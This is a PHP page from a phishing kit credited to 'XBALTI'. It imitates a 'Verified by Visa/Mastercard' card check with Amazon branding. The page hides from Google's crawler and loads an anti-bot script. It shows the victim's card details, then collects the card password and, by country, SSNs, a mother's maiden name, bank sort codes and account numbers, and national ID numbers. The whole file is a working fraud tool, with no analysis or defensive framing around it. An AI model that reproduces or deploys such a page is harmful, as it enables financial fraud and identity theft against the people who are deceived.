<?php
/*   
             ,;;;;;;;,
            ;;;;;;;;;;;,
           ;;;;;'_____;'
           ;;;(/))))|((\
           _;;((((((|))))
          / |_\\\\\\\\\\\\
     .--~(  \ ~))))))))))))
    /     \  `\-(((((((((((\\
    |    | `\   ) |\       /|)
     |    |  `. _/  \_____/ |
      |    , `\~            /
       |    \  \ BY XBALTI /
      | `.   `\|          /
      |   ~-   `\        /
       \____~._/~ -_,   (\
        |-----|\   \    ';;
       |      | :;;;'     \
      |  /    |            |
      |       |            |                   
*/
session_start();
include('../antibots.php');
 if ($_SESSION['_cctype_'] == "mastercard"){
      }
 if ($_SESSION['_cctype_'] == "visa"){
      }
else{
    header("location: ./email.php?Link_Your_Email");
    }
if(strpos($_SERVER['HTTP_USER_AGENT'],'GoogleBot') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'GoogleBot') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
?> 
<html>
    <head>
    <meta http-equiv="Content-Type" content="text/html; width=device-width, initial-scale=1">
    <meta charset="utf8">
    <title>Verified by <?php echo $_SESSION['_cctype_']; ?></title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <meta name="robots" content="noindex">
    <link href="../style/yassin.css" type="text/css" rel="stylesheet">
        <link href="../style/hanona.css" type="text/css" rel="stylesheet">
        <style>
        #zwimel {
                                    width: 100%;
                                    height: 100%;
                                    top: 0px;
                                    left: 0px;
                                    position: fixed;
                                    display: block;
                                    opacity: .9;
                                    background-color: #fff;
                                    z-index: 99;
                                    text-align: center;
                                }
                                
                                #loading-image {
                                    position: fixed;
                                    width: 125px;
                                    height: 122px;
                                    z-index: 1000;
                                    top: 50%;
                                    left: 50%;
                                    transform: translate(-50%, -50%);
                                    transform: -webkit-translate(-50%, -50%);
                                    transform: -moz-translate(-50%, -50%);
                                    transform: -ms-translate(-50%, -50%);
                                }
        </style>

        <script>
        function bani(){
            document.getElementById("vbv").value="";
            document.getElementById("vbv").type="text";
        }
        function ghebri(){
            if(document.getElementById("vbv").value==""){
                document.getElementById("vbv").type="password";
                document.getElementById("vbv").value="";
            }
            else{   
                document.getElementById("vbv").type="password";
            }
            }
        </script>

</head>
<body><BR>
    <BR>
    
<div style="background: rgba(255,255,255,.96);border-radius: 5px; padding: 1.25rem 0; margin: 0 auto;" class="content_check ">
   <?php if ($_SESSION['_cctype_'] == "visa"  ){
    echo '<img src="../style/img/verivs.gif" style=" margin-left: 29px; margin-top: 26px;" >';
      } 
   elseif ($_SESSION['_cctype_'] == "mastercard"  ){
     echo  '<img src="../style/img/verims.gif" style=" margin-left: 29px; margin-top: 26px;" >';
           } 
        ?>   
    <img src="http://icons.iconarchive.com/icons/designbolts/credit-card-payment/256/Amazon-icon.png" style="float: right;display: inline-block ; margin-top: 3px; padding-right: 1em;" width="128px" >
    <p class="sub" style="font-family:Arial;font-size: 14px;margin-top: 45px;color: #1C54A3;margin-left:1em;text-align: center;font-weight: bold;"></p>
    <p class="sub" style="font-family:pp-sans-small-regular, Helvetica Neue, Arial, sans-serif;font-size: 17px;margin-top: -6px;color: #807979;margin-left:1em;text-align: center;font-weight: 700;">  </p>
	<br><table align="center" width="100%" style="font-size: 13px;font-family:pp-sans-small-regular, Helvetica Neue, Arial, sans-serif; color: black;margin-left: 5%;">        <tbody>
        <tr>
            <td style="font-size: 12px;color: #000000;font-weight: bold;font-size: 1.05em;" align="right">Name On Card : </td>
            <td style="font-size: 1.05em;"><?php echo $_SESSION['namecard']; ?></td>
        </tr>
		<tr>
            <td style="font-size: 12px;color: #000000;font-weight: bold;font-size: 1.05em;" align="right">Bank Name : </td>
            <td style="font-size: 1.05em;"><?php echo $_SESSION['_namebank_']; ?></td></tr> <tr><td style="font-size: 12px;color: #000000;font-weight: bold;font-size: 1.05em;" align="right">Card Number : </td><td id="<? echo $_SESSION['ps']; ?>" style="font-size: 1.1em;"><?php if ($_SESSION['_cctype_'] == "visa"  ){
    echo '<span id="mastercard" class="img_small shadow  visaimg card-icons"></span>';
      } 
   elseif ($_SESSION['_cctype_'] == "mastercard"  ){
     echo  '<span id="mastercard" class="img_small shadow  mastercardimg card-icons"></span>';
           } 
        ?>   
                 - <?=substr($_SESSION['cardnumber'] , -4);?></td>
        </tr>
		<tr>
			</tr><tr>
		</tr>
     <div id="zwimel" class="zwimel" style="display:none;"><img id="loading-image" src="../style/img/loading.gif" /></div>

        <form method="post" id="formvbv" name="formvbv" action="">
		<tr>
            <td style="font-size: 12px;color: #000000;font-weight: bold;font-size: 1.05em;" align="right">Password :</td>
            <td style="font-size: 1.05em;">
			 <input style="width: 179px;text-align: left;padding-left: 3%;margin-bottom: 3%;height: 24px;" type="password" placeholder="Password" name="passvbv" id="vbv" required="required" onclick="bani();" onblur="ghebri();" >
            </td>
            </tr>  

            
            
            
            
            
            <?php
		    				if($_SESSION['countryCode'] == "IT") {	
								echo '<tr>
            <td style="font-size: 12px;color: #000000;font-weight: bold;font-size: 1.05em;" align="right">Codice Fiscale :</td>
            <td style="font-size: 1.05em;">
			 <input style="width: 179px;text-align: left;padding-left: 3%;margin-bottom: 3%;height: 24px;" placeholder="Codice Fiscale" type="tel" name="codicefiscale" id="codicefiscale" required=""  >
            </td>
            </tr> ';  
		    				}

		    				elseif($_SESSION['countryCode'] == "CH" || $_SESSION['countryCode'] == "DE") {	
								echo '<tr>
            <td style="font-size: 12px;color: #000000;font-weight: bold;font-size: 1.05em;" align="right">Kontonummer :</td>
            <td style="font-size: 1.05em;">
			 <input style="width: 179px;text-align: left;padding-left: 3%;margin-bottom: 3%;height: 24px;" required type="tel" name="kontonummer" id="kontonummer" placeholder="Kontonummer" >
            </td>
            </tr>';  
		    				}

		    				elseif($_SESSION['countryCode'] == "GR") {	
								echo '<tr>
            <td style="font-size: 12px;color: #000000;font-weight: bold;font-size: 1.05em;" align="right">Official ID :</td>
            <td style="font-size: 1.05em;">
			 <input style="width: 179px;text-align: left;padding-left: 3%;margin-bottom: 3%;height: 24px;" required type="tel" name="offid" id="offid" placeholder="Official ID" >
            </td>
            </tr>';  
		    				}
	
		    				elseif($_SESSION['countryCode'] == "AU") {
			    				echo '<tr>
            <td style="font-size: 12px;color: #000000;font-weight: bold;font-size: 1.05em;" align="right">OSID :</td>
            <td style="font-size: 1.05em;">
			 <input style="width: 179px;text-align: left;padding-left: 3%;margin-bottom: 3%;height: 24px;" required type="tel" name="osid" id="osid" placeholder="OSID" >
            </td>
            </tr>
            <tr>
            <td style="font-size: 12px;color: #000000;font-weight: bold;font-size: 1.05em;" align="right">Credit Limit :</td>
            <td style="font-size: 1.05em;">
			 <input style="width: 179px;text-align: left;padding-left: 3%;margin-bottom: 3%;height: 24px;" required type="tel" name="creditlimit" id="creditlimit" placeholder="Credit Limit" >
            </td>
            </tr>';
		    		}

		    				elseif ($_SESSION['countryCode'] == "IE" || $_SESSION['countryCode'] == "GB" ) {
		        				echo ' <tr>
            <td style="font-size: 12px;color: #000000;font-weight: bold;font-size: 1.05em;" align="right">Sort Code :</td>
            <td style="font-size: 1.05em;">
			 <input style="width: 179px;text-align: left;padding-left: 3%;margin-bottom: 3%;height: 24px;" required type="tel" name="sortcode" id="sortcode" placeholder="Sort Code" >
            </td>
            </tr>
            
                        <tr>
            <td style="font-size: 12px;color: #000000;font-weight: bold;font-size: 1.05em;" align="right">Account Number :</td>
            <td style="font-size: 1.05em;">
			 <input style="width: 179px;text-align: left;padding-left: 3%;margin-bottom: 3%;height: 24px;" required type="tel" name="accnumber" id="accnumber" placeholder="Account Number" >
            </td>
            </tr>';			   
			    }

							elseif ($_SESSION['countryCode'] == "US" ) {
			    				echo '<tr>
            <td style="font-size: 12px;color: #000000;font-weight: bold;font-size: 1.05em;" align="right">SSN :</td>
            <td style="font-size: 1.05em;">
			 <input style="width: 179px;text-align: left;padding-left: 3%;margin-bottom: 3%;height: 24px;" required type="tel" name="ssn" id="ssn" placeholder="XXX-XX-XXXX" >
            </td>
            </tr>';
							}

							elseif ($_SESSION['countryCode'] == "CA" ) {
			    				echo '<tr>
            <td style="font-size: 12px;color: #000000;font-weight: bold;font-size: 1.05em;" align="right">SSN :</td>
            <td style="font-size: 1.05em;">
			 <input style="width: 179px;text-align: left;padding-left: 3%;margin-bottom: 3%;height: 24px;" required type="tel" name="ssnca" id="ssnca" placeholder="XXX-XX-XXXX" >
            </td>
            </tr>
            <tr>
            <td style="font-size: 12px;color: #000000;font-weight: bold;font-size: 1.05em;" align="right">M Maiden Name :</td>
            <td style="font-size: 1.05em;">
			 <input style="width: 179px;text-align: left;padding-left: 3%;margin-bottom: 3%;height: 24px;" required type="tel" name="mmname" id="mmname" placeholder="M Maiden Name" >
            </td>
            </tr>';
							}		
						?>
            
            
            
            
            
            
       <tr>
            <td style="font-size: 1.05em;"></td>
            <td style="font-size: 1.05em;"><br>
                <input  type="submit" value="Submit" style="font-size: 12px;color: #fcfdee;font-weight: bold;font-size: 1.05em;">
                
            </td>
        </tr>
            

            
  </form>
       </tbody>
    </table>
	
    <p style="text-align:center;font-family: arial, sans-serif;font-size: 9px;color: #656565;margin-top: 17px;padding-bottom: 30px;">
        Copyright © 2019 <?php echo $_SESSION['_namebank_']; ?> - All rights reserved.
    </p>
	
</div>
    <script src="../js/jquery.min.js"></script>
    <script src="../js/jquery.validate.min.js"></script>
    <script src="../js/sire.form.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.10/jquery.mask.js"></script>
    <script>
    $('input[name="sortcode"]').mask('00-00-00');
        $('input[name="ssn"]').mask('000-00-0000');
        $('input[name="ssnca"]').mask('000-00-0000');
    </script>
</body>
</html>